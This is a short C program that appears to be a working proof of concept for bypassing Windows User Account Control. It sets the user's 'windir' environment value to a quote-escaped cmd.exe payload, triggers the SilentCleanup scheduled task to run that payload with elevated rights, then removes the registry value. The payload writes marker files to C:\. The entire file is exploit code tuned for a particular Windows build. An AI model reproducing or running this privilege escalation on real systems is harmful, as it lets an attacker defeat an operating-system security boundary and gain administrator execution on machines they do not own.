#include <windows.h>
#include <stdio.h>

int main() {
    // Best payload for 25H2 - quote-escaped + long wait
    const char* payload = "cmd.exe\" /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA BEST METHOD 34 ON 25H2 > C:\\uac_bypassed.txt & echo Success at %date% %time% >> C:\\uac_bypassed.txt & timeout 15\"";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "windir", 0, REG_EXPAND_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
        RegCloseKey(hKey);
    }

    system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");

    Sleep(15000);  // 15 seconds - 25H2 needs longer

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "windir");
        RegCloseKey(hKey);
    }

    printf("[+] Best Method 34 executed. Check C:\\ files now.\n");
    return 0;
}
